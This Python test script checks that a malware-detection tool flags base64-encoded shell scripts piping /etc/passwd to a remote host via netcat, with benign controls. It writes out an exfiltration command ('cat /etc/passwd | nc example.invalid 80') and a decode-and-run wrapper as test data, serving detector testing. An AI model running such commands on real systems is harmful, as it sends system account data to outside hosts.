#!/usr/bin/env python3
"""Check encoded account-file network pipelines and benign controls."""
import base64
import json
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
trait = 'objectives/exfiltration/stealer/system-info/identity::base64-passwd-netcat-pipeline'
cases = {
    'account.sh': ('cat /etc/passwd | nc example.invalid 80', True),
    'other-file.sh': ('cat /etc/hosts | nc example.invalid 80', False),
    'no-network.sh': ('cat /etc/passwd | sort', False),
}
with tempfile.TemporaryDirectory(prefix='encoded-account-') as tmp:
    paths = []
    for name, (payload, _) in cases.items():
        encoded = base64.b64encode(payload.encode()).decode()
        path = Path(tmp) / name
        path.write_text(f'#!/bin/sh\necho {encoded} | base64 -d | sh\n')
        paths.append(str(path))
    result = subprocess.run(
        [str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths],
        check=True, capture_output=True, text=True,
    )
    seen = set()
    for line in result.stdout.splitlines():
        for f in json.loads(line)['files']:
            name = Path(f['path']).name
            if name not in cases:
                continue
            actual = trait in {t['id'] for t in f.get('traits', [])}
            assert actual == cases[name][1], (name, actual, cases[name][1])
            seen.add(name)
    assert seen == set(cases), seen
print('Encoded netcat account-file boundaries passed.')
